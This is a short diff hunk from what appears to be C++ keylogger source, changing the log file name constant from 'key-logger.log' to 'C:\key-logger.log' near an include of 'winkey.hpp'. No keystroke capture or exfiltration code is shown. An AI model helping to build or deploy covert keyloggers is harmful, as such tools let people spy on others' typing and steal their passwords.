@@ -12,7 +12,7 @@
 
 #include "winkey.hpp"
 
-#define FILENAME "key-logger.log"
+#define FILENAME "C:\\key-logger.log"
 
 class duplicated_stream
 {
